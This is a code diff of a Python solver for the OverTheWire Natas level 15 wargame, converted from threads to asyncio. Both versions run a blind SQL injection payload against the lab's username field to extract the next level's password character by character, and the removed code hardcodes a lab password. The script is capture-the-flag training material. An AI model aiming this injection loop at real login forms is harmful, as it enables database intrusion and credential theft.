@@ -1,58 +1,74 @@
 import urllib.request
 import threading
+import string
+import aiohttp
+import asyncio
+from halo import Halo
 
 
-def main():
-    # Credentials
-    url = "http://natas15.natas.labs.overthewire.org"
-    username = "natas15"
-    natas15_pwd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB" # <- Change This!
+async def get_password_request(session, data, character):
+    url = "http://natas15.natas.labs.overthewire.org/"
+    async with session.post(url, data=data) as response:
+        return await response.text(), character
 
-    characters = "abcdefghijklmnopqrstuvwxyz"
-    characters += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    characters += "1234567890"
 
-    bandit16_pwd = []
-    threads = []
-
-    def test_password(character, password):
-        # Authentication
-        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
-        password_mgr.add_password(None, url, username, natas15_pwd)
-        handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
-        opener = urllib.request.build_opener(handler)
-        opener.open(url)
-        urllib.request.install_opener(opener)
-
-        # SQL Injection
-        payload = f'natas16" AND password LIKE BINARY "{password + character}%"-- -'
-        data = {"username": payload}
-        data = urllib.parse.urlencode(data).encode()
-        req = urllib.request.Request(url, data=data)
-        resp = urllib.request.urlopen(req)
-
-        if b"This user exists" in resp.read():
-            bandit16_pwd.append(character)
+async def get_password(session):
+    spinner = Halo(text='The password for natas 16 is: ',
+                   spinner='bouncingBar', color="blue")
+    spinner.start()
+    characters = string.ascii_letters + string.digits
+    natas16_password = ""
 
     for _ in range(32):
-        password = "".join(bandit16_pwd)
-        print(password)
+        tasks = []
+        spinner.stop()
+        spinner = Halo(text='The password for natas 16 is: ' + natas16_password,
+                       spinner='bouncingBar', color="blue")
+        spinner.start()
 
-        # For every character it creates a thread that make a request to the webpage
         for character in characters:
-            t = threading.Thread(target=test_password, args=(character, password))
-            threads.append(t)
+            payload = f'natas16" AND password LIKE BINARY "{natas16_password + character}%"-- -'
+            data = {"username": payload}
+            tasks.append(asyncio.ensure_future(get_password_request(session, data, character)))
 
-        for x in threads:
-            x.start()
+        requests = await asyncio.gather(*tasks)
+        for response in requests:
+            """
+            The get_password_request return the html of the request and the character for the SQLinjection,
+            it keeps the html in response[0] and the character in response[1].
+            """
+            if "This user exists" in response[0]:
+                natas16_password += response[1]
 
-        for x in threads:
-            x.join()
-        threads = []
 
-    bandit16_pwd = "".join(bandit16_pwd)
-    print(bandit16_pwd)
+    spinner.succeed(text="The password for natas 16 is: " + natas16_password)
+
+    return natas16_password
+
+
+async def make_session(natas15_password):
+    """
+    Create a session and start running an asynchronous function
+    that exploits the SQLinjection in natas 15.
+    """
+    auth = aiohttp.BasicAuth("natas15", natas15_password)
+    async with aiohttp.ClientSession(auth=auth) as session:
+        natas16_password = await get_password(session)
+
+    return natas16_password
+
+
+def get_natas16_password(natas15_password):
+    """
+    Create an event loop and run an asynchronous function.
+    """
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    natas16_password = asyncio.run(make_session(natas15_password))
+
+    return natas16_password
 
 
 if __name__ == "__main__":
-    main()
+    natas15_password = ""  # Put here the password for natas15 here
+    get_natas16_password(natas15_password)
